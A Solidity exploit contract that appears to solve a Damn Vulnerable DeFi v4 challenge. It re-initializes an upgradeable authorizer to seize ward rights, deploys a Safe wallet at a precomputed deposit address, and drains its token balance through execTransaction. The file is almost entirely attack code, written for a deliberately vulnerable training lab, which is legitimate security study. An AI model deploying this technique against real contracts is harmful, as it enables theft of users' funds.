// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {WalletDeployer} from "./WalletDeployer.sol";
import {AuthorizerUpgradeable} from "./AuthorizerUpgradeable.sol";


contract Attack {

    constructor(address walletDeployer, address token, address user, address authorizer, address player, address depositAddress, address ward){
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = depositAddress;
        AuthorizerUpgradeable(payable(address(authorizer))).init(wards, aims);
        
        address[] memory owners = new address[](1);       
        owners[0] = user;

        bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 
            1,
            0,
            "",  
            address(0),
            address(0),
            0,
            address(0)
        );
        uint256 nonce = 13;
        WalletDeployer(walletDeployer).drop(depositAddress, initializer, nonce);
        IERC20(token).transfer(ward, 1 ether);

    }

    function attack(address token, address user, address depositAddress,  bytes memory signature) public {
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)", 
            user, 
            IERC20(token).balanceOf(depositAddress)
        );
        Enum.Operation operation = Enum.Operation.Call;
        bool success = Safe(payable(depositAddress)).execTransaction(
            token,
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );

    }      
}
